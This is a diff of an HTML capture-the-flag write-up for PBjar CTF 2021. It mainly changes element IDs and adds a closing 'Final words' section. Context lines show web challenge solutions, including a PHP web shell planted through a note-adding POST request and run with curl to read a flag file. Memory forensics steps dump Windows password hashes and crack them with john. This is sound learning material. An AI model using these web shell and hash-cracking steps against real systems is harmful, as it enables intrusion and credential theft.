@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-10-31 Mon 22:34 -->
+<!-- 2022-11-01 Tue 12:42 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>PBjar ctf 2021</title>
@@ -55,6 +55,7 @@
 <li><a href="#orge6f4d5e">10. tippy tappies&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></a></li>
 <li><a href="#org875259d">11. memedium&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></a></li>
 <li><a href="#org96ff82b">12. Mr. Robot and Friends&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></a></li>
+<li><a href="#org5cc5a70">13. Final words</a></li>
 </ul>
 </div>
 </nav>
@@ -88,7 +89,7 @@ The description gave us the user name <code>admin</code>, supplying the password
 <p>
 So if we change the request type from <code>POST</code> to <code>PUT</code>, and send the data in the body:<br>
 </p>
-<pre class="example" id="org7698f4f">
+<pre class="example" id="org1dd8126">
 PUT /index.php HTTP/1.1
 Host: 147.182.172.217:42003
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -106,7 +107,7 @@ username=admin&amp;password=admin
 </pre>
 
 
-<figure id="org4d98d46">
+<figure id="orgdf30975">
 <img src="assets/2021-09-18_15-59-34_screenshot.png" alt="2021-09-18_15-59-34_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>And we got the flag!</figcaption>
@@ -115,7 +116,7 @@ username=admin&amp;password=admin
 <p>
 This can also be done quite easily with(as the challenge name implies), <code>curl</code>:<br>
 </p>
-<pre class="example" id="orgfbf00d7">
+<pre class="example" id="orgefc0f0d">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl -X PUT "http://147.182.172.217:42003/index.php" -d "username=admin&amp;password=admin"
 
@@ -189,7 +190,7 @@ This however doesn't stop us from simply inserting an ekstra set of bad characte
 <p>
 So in burp suite I edited the <code>POST</code> request to create a simple PHP shell:<br>
 </p>
-<pre class="example" id="orge529e91">
+<pre class="example" id="org402d292">
 POST /addnote.php HTTP/1.1
 Host: 147.182.172.217:42002
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -218,7 +219,7 @@ echo "&lt;/pre&gt;";?&gt;
 <p>
 Then just run the following <code>curl</code> command on the newly created note:<br>
 </p>
-<pre class="example" id="org6625bf2">
+<pre class="example" id="orge7fc93a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl "http://147.182.172.217:42002/c0N8GENVYy1EwaR.php?cmd=cat%20../../../flag.php"
 Ran: cat ../../../flag.php | Ret: 0
@@ -278,7 +279,7 @@ The compared to the previous challenge, there is an extra <code>str_replace_firt
 <p>
 And looking at the added <code>str_replace</code> calls, I figured that I could basically use the same PHP shell and add an extra "&lt;?".<br>
 </p>
-<pre class="example" id="orga828e7f">
+<pre class="example" id="orgdf36abd">
 POST /addnote.php HTTP/1.1
 Host: 147.182.172.217:42007
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -307,7 +308,7 @@ echo "&lt;/pre&gt;";?&gt;
 <p>
 And run the following <code>curl</code> command on the new note:<br>
 </p>
-<pre class="example" id="orgb71c18d">
+<pre class="example" id="org7205d19">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/programmers_hate_programming ]
 └─&gt; $ curl "http://147.182.172.217:42007/kuvQDsVlC0ybArZ.php?cmd=cat%20../../../flag.php"
 Ran: cat ../../../flag.php | Ret: 0
@@ -368,7 +369,7 @@ flag{wA1t_a_m1nUt3_
 
 
 
-<figure id="orge6d50f7">
+<figure id="orgf411cfe">
 <img src="assets/2021-09-21_09-15-53_screenshot.png" alt="2021-09-21_09-15-53_screenshot.png"><br>
 
 </figure>
@@ -395,7 +396,7 @@ Convert the hexvalue in <a href="convert/file.txt">convert/file.txt</a> to ascii
 <p>
 This can quickly be done using <code>xxd</code>:<br>
 </p>
-<pre class="example" id="orgecd62d1">
+<pre class="example" id="org7681652">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/convert ]
 └─&gt; $ cat convert/file.txt | xxd -r -p
 flag{dis_is_a_fl4ggg_h1}%
@@ -413,7 +414,7 @@ This binary would print a lot of text containing fake flags, an just one real fl
 <p>
 To find the real flag I ran <code>strings</code> on the binary and chained a couple of <code>grep</code> calls togehter:<br>
 </p>
-<pre class="example" id="org51cf3df">
+<pre class="example" id="org54ce968">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/polymer ]
 └─&gt; $ strings polymer | grep -o -E "flag\{[a-zA-Z0-9_]+\}" | grep -v "flag{n0t_th3_fl4g_l0l}"
 flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921}
@@ -485,7 +486,7 @@ Now all we need to do run the following command:<br>
 And grab a cup of coffe while we wait.<br>
 Once the script is done, we can look in the <code>output</code> file and we got the flag:<br>
 </p>
-<pre class="example" id="orge55b803">
+<pre class="example" id="org90d25a0">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/stegosaurus ]
 └─&gt; $ cat output.txt                                   
 flag{ungulatus_better_than_stenops}
@@ -516,7 +517,7 @@ I also added a filter, to eliminate unwanted data.<br>
 <p>
 Then I exported to csv:<br>
 </p>
-<pre class="example" id="orgde5a739">
+<pre class="example" id="org57a067a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ head extracted_info_2.csv                                                         15:16
 "No.","Time","Source","Port","Destination","Port","Protocol","Length","Keys","Info"
@@ -547,7 +548,7 @@ python key_extractor.py &gt; characters.txt
 </pre>
 
 
-<pre class="example" id="orgc9bf41d">
+<pre class="example" id="org7f35792">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ cat characters.txt                                                                15:31
 No map found for this value: 55
@@ -574,7 +575,7 @@ I didn't finish as after doing the same thing time and time again, I was suddenl
 <p>
 Resulting in me skipping to the end where I found the flag:<br>
 </p>
-<pre class="example" id="orgc08d09a">
+<pre class="example" id="orgec80656">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/tippy_tappies ]
 └─&gt; $ cat char_log.txt                                                                  15:37
 RET sudo SPC apt-get SPC update RET user RET
@@ -615,7 +616,7 @@ When doing forensics on this type of file, a popular tool to use is <code>volati
 <p>
 Let us first get some information about the system, i'll start with the plugin <code>banners.Banners</code>, which find linux related banners:<br>
 </p>
-<pre class="example" id="orgebe126e">
+<pre class="example" id="orgcda47c3">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem banners.Banners                      
 Volatility 3 Framework 1.0.1
@@ -628,7 +629,7 @@ Offset  Banner
 <p>
 Not much to see here, so it probably runs Windows, but let's use the <code>windows.info.Info</code> plugin:<br>
 </p>
-<pre class="example" id="org5effd11">
+<pre class="example" id="orge86ce75">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem windows.info.Info                  
 Volatility 3 Framework 1.0.1
@@ -663,7 +664,7 @@ PE TimeDateStamp        Sun Apr 13 18:31:06 2008
 Bingo!<br>
 Now that I know the OS of the image, i'll dump the hashes using <code>windows.hashdump.Hashdump</code>:<br>
 </p>
-<pre class="example" id="orgc9059b7">
+<pre class="example" id="org07abac0">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ vol -f mememachinememory.vmem windows.hashdump.Hashdump                           11:39
 Volatility 3 Framework 1.0.1
@@ -680,7 +681,7 @@ SUPPORT_388945a0        1002    aad3b435b51404eeaad3b435b51404ee        9546430b
 <p>
 I then took these hashes, put them into a file and formatted it to match <code>john</code> format for cracking:<br>
 </p>
-<pre class="example" id="org5aff889">
+<pre class="example" id="orgf4d4bd6">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ cat hashes.txt                                                                    11:46
 Administrator:31a5167ba5ce8351b0110a9d13636cd9
@@ -692,7 +693,7 @@ SUPPORT_388945a0:9546430bd8979312c16cb95d28bfc853
 <p>
 Then I used <code>john</code> with the wordlist <code>rockyou.txt</code>, hoping that it would contain the right password:<br>
 </p>
-<pre class="example" id="orga4fae98">
+<pre class="example" id="orgc86d9c1">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/memedium ]
 └─&gt; $ john --rules=all --wordlist=$REPOS/SecLists/Passwords/Leaked-Databases/rockyou.txt --format=NT hashes.txt
 --------------------------------------------------------------------------
@@ -741,7 +742,7 @@ Which more or less means that it is a suspended virtual machine.<br>
 I started of the same way as <a href="#org875259d">memedium</a>, with trying to identify the OS.<br>
 Altough I had some problems using <code>volatility3</code> on this challenge, so I used <code>volatility2</code> instead.<br>
 </p>
-<pre class="example" id="org4eff4e6">
+<pre class="example" id="org603cc48">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss imageinfo                                        12:10
 Volatility Foundation Volatility Framework 2.6.1
@@ -765,7 +766,7 @@ INFO    : volatility.debug    : Determining profile based on KDBG search...
 <p>
 Now that I know the profile, I'll list the processes running:<br>
 </p>
-<pre class="example" id="org484ff2a">
+<pre class="example" id="orgf350c89">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss --profile=Win7SP1x86_23418 pslist                12:11
 Volatility Foundation Volatility Framework 2.6.1
@@ -820,7 +821,7 @@ Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Star
 Since we want the email of the attacker, a good bet would be to look at the memory of the outlook process.<br>
 This can be dumped using the <code>memdump</code> plugin, with the <code>PID</code> of the outlook  process.<br>
 </p>
-<pre class="example" id="org94825fd">
+<pre class="example" id="org26831d4">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ vol.py -f mrrobotandfriends.vmss --profile=Win7SP1x86_23418 memdump -p 3196 -D .  12:21
 Volatility Foundation Volatility Framework 2.6.1
@@ -831,7 +832,7 @@ Writing OUTLOOK.EXE [  3196] to 3196.dmp
 <p>
 Now we can use <code>strings</code> in a combination with <code>grep</code> to search for what we want:<br>
 </p>
-<pre class="example" id="org583c09e">
+<pre class="example" id="org52c1cbd">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/pbjar21/mrrobot ]
 └─&gt; $ strings 3196.dmp | grep -E "([a-zA-Z0-9_]\w+)@([a-zA-Z0-9_]\w+)\.([a-zA-Z0-9_]\w+)" | grep -v "allsafecybersec" 
 SMTP:TH3WH1T3R0S3@GMAIL.COM
@@ -868,6 +869,15 @@ On line 6 we can see the name of the attacker, which coincidentally also is the 
 <pre class="example">
 flag{The_Whit3R0s3}
 </pre>
+</div>
+</div>
+<div id="outline-container-org5cc5a70" class="outline-2">
+<h2 id="org5cc5a70"><span class="section-number-2">13.</span> Final words</h2>
+<div class="outline-text-2" id="text-13">
+<p>
+Thank you for taking some time out of your day to read this post.<br>
+If you enjoyed this post, feel free to join my <a href="https://discord.gg/t8tKrgdGWu">Discord server</a> to get notification whenever I post something and ask questions if there are any.<br>
+</p>
 </div>
 </div>
 </div>
